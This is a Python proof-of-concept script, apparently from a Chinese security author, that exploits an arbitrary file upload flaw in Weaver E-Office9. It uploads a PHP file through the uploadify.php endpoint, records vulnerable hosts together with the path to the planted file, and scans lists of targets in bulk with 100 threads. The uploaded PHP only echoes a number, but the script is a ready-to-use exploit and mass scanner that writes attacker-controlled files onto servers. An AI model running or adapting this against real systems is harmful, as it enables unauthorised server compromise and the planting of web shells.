import requests,sys,argparse,os,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = '''
        ██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗         ███████╗██╗██╗     ███████╗
        ██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗        ██╔════╝██║██║     ██╔════╝
        ██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║        █████╗  ██║██║     █████╗  
        ██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║        ██╔══╝  ██║██║     ██╔══╝  
        ╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝███████╗██║     ██║███████╗███████╗
         ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝     ╚═╝╚══════╝╚══════╝ 
                                                                                        author:秋妤
                                                                                        date:2024.09.21
                                                                                        version:1.0
    '''
    print(test)


def poc(target):
    payload = '/inc/jquery/uploadify/uploadify.php'
    headers = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Length':'227',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close',
        'Content-Type':'multipart/form-data; boundary=gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s'
    }
    data = f'--gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"1.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo 123456;?>\r\n\r\n--gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s--'
    try:
        res = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=10)
        if res.status_code == 200 and res.text.isdigit():
            print(f'[+]存在漏洞：{target},请访问路径/attachment/{res.text}/1.php')
            with open('泛微_result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'  请访问路径：/attachment/'+res.text+'/1.php\n')
        else:
            print(f'[-]不存在漏洞：{target}')
    except Exception as e:
        print(f'[!]网站异常，请手工测试：{target}')

def main():
    banner()
    url_list = []
    parser = argparse.ArgumentParser(description = "这是一个关于 泛微 E-Office9文件上传漏洞的脚本")
    parser.add_argument("-u", "--url", dest = "url", help = "Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter your file")

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()